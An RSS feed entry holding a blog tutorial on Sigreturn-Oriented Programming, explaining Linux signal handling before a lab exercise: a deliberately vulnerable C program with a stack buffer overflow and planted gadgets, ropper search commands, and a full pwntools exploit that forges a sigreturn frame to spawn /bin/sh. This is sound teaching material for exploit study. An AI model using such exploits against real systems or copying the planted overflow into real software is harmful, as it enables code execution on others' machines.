<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Binary Exploitation on GILBERT ROBERT M</title>
        <link>https://mutur4.github.io/posts/binary-exploitation/</link>
        <description>Recent content in Binary Exploitation on GILBERT ROBERT M</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>sas</copyright>
        <lastBuildDate>Sun, 06 Mar 2022 20:10:21 +0300</lastBuildDate>
        <atom:link href="https://mutur4.github.io/posts/binary-exploitation/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Sig-Return Oriented Programming (SROP)</title>
            <link>https://mutur4.github.io/posts/binary-exploitation/srop/</link>
            <pubDate>Sun, 06 Mar 2022 20:12:00 +0300</pubDate>
            
            <guid>https://mutur4.github.io/posts/binary-exploitation/srop/</guid>
            <description>This is a yet another binary exploitation attack that is somewhat similar to return-oriented-programming (ROP) and to understand how this works, we first need to understand how C signals work.
Signals in C Each signal has a current disposition and this is used to determine how a process behaves when it is delivered a signal. The following is used to specify the default disposition for each signal.
- Term : The default action is to terminate the process - Ign: The default action is to ignore the process	- Core: This is used to ignore the process and dump core (core dump file): Some of the signals, their default actions is to terminate and produce a core dump file.</description>
            <content type="html"><![CDATA[<p>This is a yet another binary exploitation attack  that is somewhat similar to
return-oriented-programming (ROP) and to understand how this works, we first need
to understand how C signals work.</p>
<h3 id="signals-in-c">Signals in C</h3>
<p>Each signal has a current disposition and this is used to determine
how a process behaves when it is delivered a signal. The following
is used to specify the default disposition for each signal.</p>
<pre><code>- Term : The default action is to terminate the process

- Ign: The default action is to ignore the process	

- Core: This is used to ignore the process and dump core

(core dump file): Some of the signals, their default actions is 
to terminate and produce a core dump file. This is a file that contains 
an image of the process memory at the time of termination. This image
can be used in a debugger to inspect the state of the program at the time 
that it was terminated. 

- Stop: This is used to stop the process	
- Cont: This is used to continue the process if it is currently stopped
</code></pre>
<p>A process can therefore change the disposition of a signal using <code>sigaction()</code> and
<code>signal()</code>. A signal handler is a user-defined function that is executed when
a signal occurs and its stack frame is created on the current processes&rsquo; stack. It is also possible
to make the signal handler use an alternate stack using the <code>sigalstack()</code> syscall
as described in its man page.</p>
<p>The following are some of the actions that take place during the execution
of sighandlers <em>(user defined functions)</em>. When there is a transition from kernel-mode to user-mode execution <em>(eg.
return from a syscall)</em>, the kernel checks if there is a pending
unblocked signal for which the process has established a signal handler.</p>
<p>If there is a pending signal, the following takes place:</p>
<blockquote>
<p><em>(between the time when a signal is generated and when a signal is delivered
this is where we say that this is a pending signal).</em></p>
</blockquote>
<ul>
<li>
<p><input checked="" disabled="" type="checkbox"> The kernel performs the necessary preparatory steps for the
execution of the signal handler.</p>
</li>
<li>
<p><input checked="" disabled="" type="checkbox"> The signal is remove from the pending signals.</p>
</li>
<li>
<p><input checked="" disabled="" type="checkbox"> If the signal was installed via <code>sigaction()</code> and the flag <code>SA_ONSTACK</code> was set,
and an alternate stack is defined using <code>sigaltstack()</code> a new stack for the signal
is then installed in the specified memory region.</p>
</li>
<li>
<p><input checked="" disabled="" type="checkbox"> Otherwise, the kernel will construct a frame for the sighandler on our current
stack and will set the program counter <code>rip</code> for the process to
point to the first instruction of the sighandler function and
configures the return address for that function to point
to a piece of user-space code that is called the <code>signal trampoline</code></p>
</li>
</ul>
<blockquote>
<p><em>This is code that is used to transfer control from the kernel
back to user mode when a signal that had a handler installed is sent
to a process (signal trampoline).</em></p>
</blockquote>
<ul>
<li>
<p><input checked="" disabled="" type="checkbox"> The kernel now passes control back to the user-space and this is
where execution will start and the sighandler will be called and its code
block executed.</p>
</li>
<li>
<p><input checked="" disabled="" type="checkbox"> When the signal handler returns, it passes control back to the signal
trampoline code and this now calls <code>sigreturn()</code> a syscall that uses the
information in the stack frame that was created by the kernel in <code>(step 1)</code> to restore
the process back to how it was before the sighandler was called.</p>
</li>
</ul>
<p>When <code>sigreturn()</code> compeletes, the kernel then transfers control back to the
userspace and the process now recommenses its execution back to
the point where it was interrupted by the signal handler.</p>
<p>The following is a quick <code>C</code> snippet that is used to showcase how this works. We
are going to use a signal disposition that will continue after execution.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sighandler</span>(<span style="color:#66d9ef">int</span> signum){
</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;This will be called when the sighandler executes&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sigaction act;
</span></span><span style="display:flex;"><span>	act.sa_handler <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>sighandler;
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>	sigaction(SIGCONT, <span style="color:#f92672">&amp;</span>act, NULL);
</span></span><span style="display:flex;"><span>	kill(getpid(), SIGCONT);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;I will be printed after execution&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Compiling and running the program, we can view the syscalls during execution using the
<code>strace</code> command, and from below before the <code>puts()</code> function is called we can see
<code>rt_sigreturn</code> syscall that returns the function back to where it commenced resulting
to the output <code>I will be printed after execution</code></p>
<p>Using <code>gdb</code> you can also set a breakpoint at <code>ret</code> opcode of the sighandler function and
examine the return address. If this was a normal function, the return address would
we a function address, lets say an address somewhere at <code>main()</code> but this is a stack
address, showing evidence that the function returned to a <code>signal trampoline</code>.</p>
<h3 id="exploitation">Exploitation</h3>
<p>From what we have learned we can therefore use this to our advantage. This attack will
work by putting a forged <code>sigcontext struct</code> on the stack. This is a data structure that is
initiated by the kernel, when a sighandler is executed and it contains these
registers, pointers, flags etc.. used for restoration. After creating the forged <code>sigcontext structure</code>, we
overwrite the return address with the location of our syscall gadget <code>rt_sigreturn()</code>.</p>
<p>After execution, the process will try to go back to its intial state trusting
the values from the sigcontext, restoring them and giving us control of the program
(instruction and stack pointer).</p>
<p>The following are some of the conditions for an SROP attack:</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> A buffer overlow vulnerablilty, to control the instruction pointer.</li>
<li><input checked="" disabled="" type="checkbox"> Enough stack space to place <code>sigcontext struct</code> that is 128 bytes.</li>
<li><input checked="" disabled="" type="checkbox"> A syscall gadget to execute <code>rt_sigreturn</code> syscall.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>binsh <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span>; 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// gcc -o srop srop.c -no-pie -fno-stack-protector (compile flags)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">syscall_function</span>(){
</span></span><span style="display:flex;"><span>	__asm__(<span style="color:#e6db74">&#34;syscall; ret&#34;</span>); <span style="color:#75715e">// syscall gadget
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_rax</span>(){
</span></span><span style="display:flex;"><span>	__asm__(<span style="color:#e6db74">&#34;movl $0xf, %eax; ret;&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>){	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">16</span>];
</span></span><span style="display:flex;"><span>	read(<span style="color:#ae81ff">0</span>, buffer, <span style="color:#ae81ff">500</span>); <span style="color:#75715e">// buffer overflow
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>From the above snippet we see that the binary meets all the conditions
that are required for an srop attack. Its now time for exploitation. We will
be using a simple python script for this.</p>
<ol>
<li>First we need to locate our <code>syscall ret</code> gadget and <code>mov eax, 0xf</code> gadget.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ropper --file srop --search <span style="color:#e6db74">&#34;syscall; ret&#34;</span> <span style="color:#f92672">&amp;&amp;</span> ropper --file srop --search <span style="color:#e6db74">&#34;mov eax, 0xf; ret&#34;</span>
</span></span></code></pre></div><ol start="2">
<li>Second we find our offset located at <code>24</code> and using a simple
python script we write our payload. Python <code>pwntools</code> comes coupled with
a <code>sigreturnFrame()</code> that is used to model out <code>sigcontext struct</code>.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#! /usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./srop&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(filename)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(filename)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>syscall_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401126</span>
</span></span><span style="display:flex;"><span>mov_eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401130</span>
</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00402004</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#75715e"># fill the buffer to saved RIP</span>
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(mov_eax)
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(syscall_ret) <span style="color:#75715e"># call rt_sigreturn()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#construct sigcontext frame and control the values of out registers</span>
</span></span><span style="display:flex;"><span>        frame <span style="color:#f92672">=</span> SigreturnFrame(kernel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>)
</span></span><span style="display:flex;"><span>        frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_execve <span style="color:#75715e"># set rax to execve syscall</span>
</span></span><span style="display:flex;"><span>        frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> binsh <span style="color:#75715e"># set rdi to /bin/sh</span>
</span></span><span style="display:flex;"><span>        frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> syscall_ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> bytes(frame)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(exploit())
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>        main()
</span></span></code></pre></div><p>From the above exploit we get a full bash shell. There are more complex ways
to chain <code>srop</code> attack but this all depends with your creativity.</p>
<blockquote>
<p>Please feel free to contact me if you have any additional information or any question ✌️.</p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><input checked="" disabled="" type="checkbox"> <a href="https://amriunix.com/post/sigreturn-oriented-programming-srop/">https://amriunix.com/post/sigreturn-oriented-programming-srop/</a></li>
</ul>
]]></content>
        </item>
        
    </channel>
</rss>
